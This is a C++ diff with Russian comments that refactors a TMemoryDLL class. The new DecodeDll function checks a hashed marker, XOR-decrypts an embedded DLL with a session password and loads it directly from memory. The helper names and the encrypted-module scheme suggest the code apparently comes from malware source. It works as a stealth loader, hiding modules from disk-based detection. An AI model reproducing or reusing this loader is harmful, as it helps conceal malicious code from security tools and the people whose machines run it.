@@ -438,67 +438,26 @@ bool BuildImport(PVOID ImageBase)
 //                            TMemoryDLL
 //*****************************************************************************
 
-TMemoryDLL::TMemoryDLL(const void* DllBuf, bool DuplicateBuffer)
+TMemoryDLL::TMemoryDLL(const void* DllBuf)
 {
-	FHandle       = NULL;
-	FSize         = 0;
-	FSourceBuffer = NULL;
+	FHandle = NULL;
 
-	if (!DllBuf) return;
+	DWORD Size;
+	bool Allocated;
+	LPVOID NewBuf;
 
-	bool Encrypted = false;
-	LPBYTE Buf = (LPBYTE)DllBuf;
-	if (!IsExecutableFile((VOID*)DllBuf))
-	{
-		// Переданный буфер не является исполняемым файлом, расшифровываем его
+	if (!DecodeDll(DllBuf, Size, NewBuf, Allocated)) return;
 
-		// Проверяем маркер библиотеки. Наличие маркера в открытом виде
-		// означает, что данные длл находятся в окрытом виде
-		Encrypted = STRA::Hash((PCHAR)Buf, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH;
-		Buf += ENCRYPTED_DLL_MARKER_SIZE;
+    FHandle = MemoryLoadLibrary(NewBuf);
 
-		// Получаем размер данных
-		FSize = *(PDWORD)Buf;
-		Buf += sizeof(DWORD);
-
-		if (Encrypted || DuplicateBuffer)
-		{
-			// Расшифровываем данные
-
-			LPVOID NewBuf = MemAlloc(FSize);
-			if (!NewBuf) return;
-
-			// Копируем данные
-			m_memcpy(NewBuf, Buf, FSize);
-			Buf = (LPBYTE)NewBuf;
-
-			if (Encrypted)
-				XORCrypt::Crypt(GetSessionPassword(), Buf, FSize);
-
-			if (DuplicateBuffer)
-                FSourceBuffer = Buf;
-		}
-	}
-
-	FHandle = MemoryLoadLibrary(Buf);
-
-	if (!FHandle)
-	{
-		FSize = 0;
-		FSourceBuffer = NULL;
-	}
-
-
-	if (Encrypted && !DuplicateBuffer)
-		MemFree(Buf);
+	if (Allocated)
+        MemFree(NewBuf);
 }
 //----------------------------------------------------------------------------
 
 
 TMemoryDLL::~TMemoryDLL()
 {
-	if (FSourceBuffer)
-		MemFree(FSourceBuffer);
 	if (FHandle)
 		MemoryFreeLibrary(FHandle);
 }
@@ -518,4 +477,82 @@ bool TMemoryDLL::GetProcAddress(const char* Name, LPVOID &Addr)
 {
 	Addr = GetProcAddress(Name);
 	return Addr != NULL;
+}
+
+
+//---------------------------------------------------------
+//  Функция расшифровывает длл
+//
+//  DllBuf - Указатель на исходный буфер длл
+//
+//  Выходные параметры:
+//
+//  DllSize - размер расшифрованной длл
+//  NewBuf  - Указатель на буфер длл
+//  NewBufAllocated - Установится в истину, если
+//                    для буфера пришлось выделить память
+//---------------------------------------------------------
+bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
+{
+	DllSize = 0;
+	NewBuf  = NULL;
+	NewBufAllocated = false;
+
+	if (!DllBuf) return false;
+
+	// Файл в исходном формате
+	if (IsExecutableFile((LPVOID)DllBuf))
+	{
+		// Определяем размер длл файла
+		PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)DllBuf;
+		PIMAGE_NT_HEADERS old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(DllBuf))[dos_header->e_lfanew];;
+
+		DllSize = old_header->OptionalHeader.SizeOfHeaders +
+				  old_header->OptionalHeader.SizeOfCode +
+				  old_header->OptionalHeader.SizeOfInitializedData;
+
+        // Копируем указатель
+		NewBuf = (LPVOID)DllBuf;
+		return true;
+	}
+
+	// ДЛЛ зашифрована, расшифровываем
+
+    PCHAR Buf = (PCHAR)DllBuf;
+
+	// Проверяем маркер библиотеки. Наличие маркера в открытом виде
+	// означает, что данные длл находятся в окрытом виде
+	NewBufAllocated = STRA::Hash(Buf, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH;
+	Buf += ENCRYPTED_DLL_MARKER_SIZE;
+
+	// Получаем размер данных
+	DllSize = *(PDWORD)Buf;
+	Buf += sizeof(DWORD);
+
+	if (NewBufAllocated)
+	{
+		// Расшифровываем данные
+
+		NewBuf = MemAlloc(DllSize);
+		if (NewBuf)
+		{
+			// Копируем данные
+			m_memcpy(NewBuf, Buf, DllSize);
+			XORCrypt::Crypt(GetSessionPassword(), (LPBYTE)NewBuf, DllSize);
+        }
+	}
+	else
+		NewBuf = Buf;
+
+	bool Result = IsExecutableFile(NewBuf);
+
+	if (!Result)
+	{
+		DllSize = 0;
+		if (NewBufAllocated)
+			MemFree(NewBuf);
+		NewBuf = NULL;
+	}
+
+	return Result;
 }
